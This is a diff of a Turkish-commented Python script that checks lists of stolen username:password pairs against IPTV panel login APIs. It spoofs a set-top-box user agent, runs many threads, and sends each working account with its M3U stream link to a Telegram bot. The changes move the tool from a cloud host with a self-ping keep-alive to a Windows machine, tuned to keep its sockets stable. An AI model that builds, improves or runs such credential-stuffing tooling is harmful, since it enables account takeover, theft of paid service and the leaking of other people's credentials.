@@ -1,6 +1,7 @@
 import os
 import time
 import datetime
+import gc
 import requests
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -25,91 +26,61 @@ def telegrama_gonder(mesaj):
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
         res = requests.post(url, data=data, timeout=10)
         if res.status_code != 200:
-            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}")
-        else:
-            print("[+] Telegram bildirimi başarıyla gönderildi.")
-    except Exception as e:
-        print(f"[!] Telegram bağlantı hatası: {e}")
+            print(f"[!] Telegram hata: {res.status_code}")
+    except:
+        pass
 
 HEADERd = {
     'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
     'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
     'Accept': '*/*',
-    'Connection': 'Keep-Alive',
+    'Connection': 'close',  # Soketlerin TIME_WAIT'te yığılmasını önlemek için bağlantıyı hemen kapatıyoruz
     'Accept-Encoding': 'gzip',
     'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
 }
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Render'ın uykuya almasını engellemek için Keep-Alive (Self-Ping) fonksiyonu
-def render_uynik_tutucu():
-    time.sleep(10) # Flask tamamen ayağa kalkana kadar biraz bekle
-    app_url = os.environ.get('RENDER_EXTERNAL_URL')
-    if app_url:
-        print(f"[*] Render Keep-Alive Aktif! Hedef URL: {app_url}")
-        while True:
-            try:
-                requests.get(app_url, timeout=10)
-                print("[keep-alive] Sistem uyanık tutuluyor...")
-            except:
-                pass
-            time.sleep(300) # Her 5 dakikada bir kendine istek at
-
 def m3u_tara_detayli(session, panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
-        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
+        res = session.get(api_url, headers=HEADERd, timeout=(2, 3), verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             veri = str(res.text)
             if '"auth":1' in veri or '"status":"Active"' in veri:
                 print(f"[+] HİT YAKALANDI! Panel: {panel} | User: {user}")
                 
-                try:
-                    status = veri.split('status":')[1].split(',')[0].replace('"', '')
-                except:
-                    status = "Active"
+                try: status = veri.split('status":')[1].split(',')[0].replace('"', '')
+                except: status = "Active"
                 
-                try:
-                    acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
-                except:
-                    acon = "?"
+                try: acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
+                except: acon = "?"
                 
-                try:
-                    mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
-                except:
-                    mcon = "?"
+                try: mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
+                except: mcon = "?"
                 
                 try:
                     bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
-                    if bitis == 'null' or not bitis.isdigit():
-                        bitis = 'Sınırsız'
-                    else:
-                        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
-                except:
-                    bitis = 'Bilinmiyor'
+                    if bitis == 'null' or not bitis.isdigit(): bitis = 'Sınırsız'
+                    else: bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
+                except: bitis = 'Bilinmiyor'
 
                 try:
                     realm = veri.split('url":')[1].split(',')[0].replace('"', '')
                     port = veri.split('port":')[1].split(',')[0].replace('"', '')
-                except:
-                    realm, port = panel, "80"
+                except: realm, port = panel, "80"
 
                 kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
                 try:
                     k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
                     kanalsayisi = str(k_res.text.count('stream_id'))
-                    
                     v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
                     filmsayisi = str(v_res.text.count('stream_id'))
-                    
                     s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
                     dizisayisi = str(s_res.text.count('series_id'))
-                except:
-                    pass
+                except: pass
 
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
-                
                 mesaj = (
                     f"🟢 <b>IPTV HİT BULUNDU!</b>\n"
                     f"🌐 <b>Ana Host:</b> http://{panel}\n"
@@ -122,7 +93,6 @@ def m3u_tara_detayli(session, panel, user, pas):
                     f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
                     f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
                 )
-                
                 telegrama_gonder(mesaj)
                 return True
     except:
@@ -130,9 +100,9 @@ def m3u_tara_detayli(session, panel, user, pas):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
+    print("[*] Windows Soket Korumalı Yerel Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Keep-Alive Uyandırma Modu Devrede.")
+    telegrama_gonder("🚀 <b>Lokal Tarayıcı Aktif (Port Koruma Modu)!</b>")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -143,77 +113,73 @@ def arka_plan_tarayici():
             if os.path.exists(panel_dir):
                 for p_dosya in os.listdir(panel_dir):
                     if p_dosya.endswith('.txt'):
-                        p_yol = os.path.join(panel_dir, p_dosya)
-                        with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
+                        with open(os.path.join(panel_dir, p_dosya), 'r', encoding='utf-8', errors='ignore') as pf:
                             for line in pf:
                                 p_clean = line.strip().replace('http://', '').rstrip('/')
-                                if p_clean:
-                                    paneller.append(p_clean)
-
-            if not paneller:
-                paneller = ["ornekpanel.com:8080"]
+                                if p_clean: paneller.append(p_clean)
+            if not paneller: paneller = ["ornekpanel.com:8080"]
 
             if os.path.exists(combo_dir):
                 for dosya_adi in os.listdir(combo_dir):
                     if dosya_adi.endswith('.txt'):
                         dosya_yolu = os.path.join(combo_dir, dosya_adi)
-                        print(f"\n[i] Taranan combo dosyası: {dosya_adi}")
+                        print(f"\n[i] Taranıyor: {dosya_adi}")
                         
-                        combolar = []
-                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
-                            for line in f:
-                                line = line.strip()
-                                if ':' in line:
-                                    parts = line.split(':', 1)
-                                    user = parts[0].strip()
-                                    pas = parts[1].strip()
-                                    if user and pas:
-                                        combolar.append((user, pas))
-
-                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
+                        batch_size = 300  # Paket boyutunu küçülttük ki Windows portları rahat nefes alsın
+                        chunk = []
                         
-                        chunk_size = 1000
-                        toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
-                        
-                        # Her turda temiz bir session havuzu açıp kapatarak bellek/soket şişmesini önleyelim
                         with requests.Session() as session:
-                            adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
+                            # Havuz limitlerini Windows'a göre optimize ettik
+                            adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=0)
                             session.mount('http://', adapter)
                             session.mount('https://', adapter)
                             
-                            for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
-                                chunk = combolar[i:i + chunk_size]
-                                print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
-                                
-                                with ThreadPoolExecutor(max_workers=20) as executor:
-                                    futures = [
-                                        executor.submit(m3u_tara_detayli, session, panel, user, pas)
-                                        for user, pas in chunk
-                                        for panel in paneller
-                                    ]
-                                    for future in as_completed(futures):
-                                        pass
-                                
-                                time.sleep(0.5)
-        
-            print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
+                            with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
+                                for line in f:
+                                    line = line.strip()
+                                    if ':' in line:
+                                        parts = line.split(':', 1)
+                                        u, p = parts[0].strip(), parts[1].strip()
+                                        if u and p:
+                                            chunk.append((u, p))
+                                    
+                                    if len(chunk) >= batch_size:
+                                        with ThreadPoolExecutor(max_workers=10) as executor: # İş parçacığını 10'a sabitledik (Windows stabil çalışması için)
+                                            futures = [
+                                                executor.submit(m3u_tara_detayli, session, panel, user, pas)
+                                                for user, pas in chunk
+                                                for panel in paneller
+                                            ]
+                                            for _ in as_completed(futures):
+                                                pass
+                                        chunk.clear()
+                                        gc.collect()
+                                        time.sleep(0.2) # Windows soketlerinin kapanması için minik bir mola
+
+                                if chunk:
+                                    with ThreadPoolExecutor(max_workers=10) as executor:
+                                        futures = [
+                                            executor.submit(m3u_tara_detayli, session, panel, user, pas)
+                                            for user, pas in chunk
+                                            for panel in paneller
+                                        ]
+                                        for _ in as_completed(futures):
+                                            pass
+                                    chunk.clear()
+                                    gc.collect()
+
+            print("\n[i] Tur tamamlandı, 10 dakika bekleniyor...")
+            gc.collect()
             time.sleep(600)
         except Exception as e:
-            print(f"[!] Tarama döngüsü hatası: {e}")
+            print(f"[!] Döngü hatası: {e}")
             time.sleep(30)
 
 if __name__ == '__main__':
     import threading
-    
-    # 1. Tarayıcı thread'i
-    t_tarayici = threading.Thread(target=arka_plan_tarayici)
-    t_tarayici.daemon = True
-    t_tarayici.start()
-    
-    # 2. Render'ı uykudan koruyan keep-alive thread'i
-    t_keepalive = threading.Thread(target=render_uynik_tutucu)
-    t_keepalive.daemon = True
-    t_keepalive.start()
+    t1 = threading.Thread(target=arka_plan_tarayici)
+    t1.daemon = True
+    t1.start()
     
     print("[*] Flask Web Sunucusu Başlatılıyor...")
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
